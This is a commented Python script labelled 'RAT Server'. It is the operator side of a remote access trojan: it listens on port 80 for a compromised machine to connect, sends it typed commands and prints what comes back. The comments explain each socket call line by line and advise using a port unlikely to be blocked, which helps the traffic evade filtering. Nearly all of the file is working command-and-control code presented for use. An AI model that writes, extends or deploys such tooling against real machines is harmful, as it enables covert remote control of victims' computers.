#!/usr/bin/python

#Imports
import socket
import os

#Variables
port = 80 #The port we're listening on is 80 (HTTP)
# port is for selecting the connection port. You can use everyone you want, but I recommend to use one, which is probably not obtrusive/blocked.

#Functions
def clear():
    n = 0
    while n <= 5:
       os.system('clear')
       n = n + 1

#Starting Server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# The first parameter is AF_INET and the second one is SOCK_STREAM. 
# AF_INET refers to the address family ipv4. 
# The SOCK_STREAM means connection oriented TCP protocol.
# Now we can connect to a server using this socket.
# In this case, it is labeled for the variable "s"

host = socket.gethostname()
# Return a string containing the hostname of the machine where the Python interpreter is currently executing
# In this case, the variable "host" contains this

s.bind((host, port))
# The bind function assigns a local protocol address to a socket.
# When a socket has both an IP address and a port number it is said to be 'bound to a port', or 'bound to an address'. A bound socket can receive data because it has a complete address. The process of allocating a port number to a socket is called 'binding'.
# This method binds address (hostname, port number pair) to socket.
# In this case, we are bounding our host which was perviously defined to our past port (which was 80)

s.listen(1)
# This method sets up and start TCP listener.

clear()
print("-:-:-:-:-: RAT Server :-:-:-:-:-")

clientsocket, addr = s.accept()
# This passively accept TCP client connection, waiting until connection arrives (blocking).
# In this case, it waits till it gets a connection and puts the client's socket as "clientsocket" and address as "address"

print("Connection from: " + str(addr))
while True:
    msg = input(str() + " >  ")
    # Always waits for the input of a command (the input is given by the person running the server file)

    #if the command is "help"...
    if msg == "help":
        clear()
        print("-+-+-+-+-+ HELP LIST +-+-+-+-+-")
        print("Test Connection: 'test'")
        print("")
        input("\nPress ENTER to continue")
        clear()
        print("-:-:-:-:-: RAT Server :-:-:-:-:-")

    if msg == "clear":
        clear()
    
    else:
        msg = msg.encode("UTF-8")
        # strings are stored as Unicode, i.e. each character in the string is represented by a code point. 
        # So, each string is just a sequence of Unicode code points.

        # For efficient storage of these strings, the sequence of code points are converted into set of bytes. The process is known as encoding.

        # There are various encodings present which treats a string differently. The popular encodings being utf-8, ascii, etc.

        # In this case, our command is being encoded in the UTF-8 format

        clientsocket.send(msg)
        # This method transmits TCP message 
        # In this case, we are transmitting a TCP message of whatever we just input which is now the variable "msg"

        msg = clientsocket.recv(4096)
        # This method receives TCP message

        print(msg.decode("UTF-8"))
        # Decodes the command/message we made and then prints it for us.